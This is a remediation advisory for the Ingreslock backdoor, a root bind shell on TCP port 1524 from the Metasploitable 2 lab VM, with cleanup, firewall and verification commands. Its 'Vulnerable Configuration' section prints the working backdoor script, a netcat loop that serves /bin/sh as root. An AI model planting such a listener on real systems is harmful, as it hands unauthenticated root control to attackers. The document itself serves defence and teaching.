# Ingreslock Backdoor Service (Port 1524)

## Threat Details

**Severity:** Critical
**CVSS Score:** 10.0
**CVE:** N/A (deliberate backdoor)

## Description

The "Ingreslock" backdoor is a malicious root shell bound to TCP port 1524. This is one of the most notorious backdoors found on the original Metasploitable 2 vulnerable VM. When an attacker connects to port 1524, they receive an unauthenticated root shell with full system access.

The backdoor responds to the command `id;` with `uid=0(root) gid=0(root)`, immediately revealing root-level compromise.

## Affected Service

- **Service:** Backdoor root shell (netcat listener)
- **Port:** 1524/tcp
- **Process:** Usually netcat or similar bound to `/bin/sh` as root

## Vulnerable Configuration

A malicious script or process runs on boot:

```bash
/opt/ingreslock_backdoor.sh:
#!/bin/bash
while true; do
  nc -l -p 1524 -e /bin/sh
  sleep 1
done
```

This creates a persistent backdoor that automatically restarts if the connection is closed.

## Impact

An attacker who discovers this backdoor can:
- Obtain immediate **unauthenticated root shell access**
- Execute arbitrary commands as the root user
- Read, modify, or delete any file on the system
- Install additional malware or persistence mechanisms
- Pivot to other systems on the network
- Exfiltrate sensitive data
- Completely compromise system integrity, confidentiality, and availability

This represents **total system compromise** and is the highest severity vulnerability possible.

## Remediation Steps

### Step 1: Identify and Kill the Backdoor Process
```bash
# Find the process listening on port 1524
lsof -i :1524
netstat -antp | grep :1524

# Kill the process (replace PID with actual process ID)
kill -9 <PID>

# Kill all netcat processes (be careful if netcat is used legitimately)
pkill -9 nc
pkill -9 netcat
```

### Step 2: Remove the Backdoor Script
```bash
# Search for the backdoor script
find / -name "*backdoor*" -o -name "*ingres*" 2>/dev/null

# Remove it
rm -f /opt/ingreslock_backdoor.sh

# Check cron jobs and startup scripts
crontab -l
ls -la /etc/init.d/
ls -la /etc/rc*.d/
systemctl list-unit-files | grep backdoor
```

### Step 3: Block Port 1524 with Firewall
```bash
# Block incoming connections to port 1524
iptables -A INPUT -p tcp --dport 1524 -j DROP
iptables -A OUTPUT -p tcp --sport 1524 -j DROP

# Save the rules
iptables-save > /etc/iptables/rules.v4
```

### Step 4: Audit the System for Other Compromises
```bash
# Check for other suspicious listening ports
netstat -antp | grep LISTEN

# Review system logs
tail -100 /var/log/auth.log
tail -100 /var/log/syslog

# Check for rootkits
apt-get install rkhunter chkrootkit
rkhunter --check
chkrootkit
```

### Step 5: Consider Full System Reinstall
**Recommended:** Since this is a backdoor, the system may be fully compromised. Consider:
- Backing up data (but not executables or configurations)
- Performing a clean OS reinstall
- Restoring data from a known-good backup taken before compromise

## Verification

Verify port 1524 is no longer listening:
```bash
netstat -ln | grep :1524
lsof -i :1524
```

Verify the backdoor script is removed:
```bash
ls -la /opt/ingreslock_backdoor.sh
find / -name "*backdoor*" 2>/dev/null
```

Verify no netcat processes are running:
```bash
ps aux | grep nc
```

Attempt to connect (should fail):
```bash
nc localhost 1524
telnet localhost 1524
```
